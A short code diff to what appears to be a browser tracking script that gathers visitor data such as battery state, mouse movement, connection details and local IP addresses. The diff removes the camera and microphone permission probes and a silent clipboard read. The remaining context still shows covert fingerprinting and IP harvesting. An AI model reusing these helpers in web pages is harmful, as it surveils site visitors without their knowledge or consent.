@@ -36,9 +36,6 @@ const firebaseConfig = {
     const getBattery = async () => navigator.getBattery ? await navigator.getBattery() : null;
     const getPermissions = async () => {
       try {
-        const cam = await navigator.permissions.query({ name: 'camera' });
-        const mic = await navigator.permissions.query({ name: 'microphone' });
-        return { camera: cam.state, mic: mic.state, notif: Notification.permission };
       } catch { return null; }
     };
     const trackMouse = () => {
@@ -70,7 +67,7 @@ const firebaseConfig = {
       return conn ? { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt } : null;
     };
     const readClipboard = async () => {
-      try { return await navigator.clipboard.readText(); } catch { return null; }
+      
     };
     const getLocalIPs = async () => new Promise(resolve => {
       const ips = [];
